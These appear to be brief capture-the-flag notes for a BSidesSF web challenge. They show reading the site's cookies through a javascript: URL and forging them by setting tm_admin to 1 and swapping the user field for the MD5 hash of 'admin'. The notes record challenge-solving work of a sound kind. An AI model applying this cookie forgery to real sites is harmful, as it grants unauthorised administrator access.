https://thinmint-baeaa80f.challenges.bsidessf.net/

read cookies with this snippet in URL:
```
javascript:alert(document.cookie)
```
content:
```
tm_admin=0; tm_user=294de3557d9d00b3d2d8a1e6aab028cf
```
boolean + md5hash(user)

tampering cookie:

```
tm_admin=0 -> tm_admin=1
```
```
294de3557d9d00b3d2d8a1e6aab028cf-> anonymous
admin -> 21232f297a57a5a743894a0e4a801fc3
```
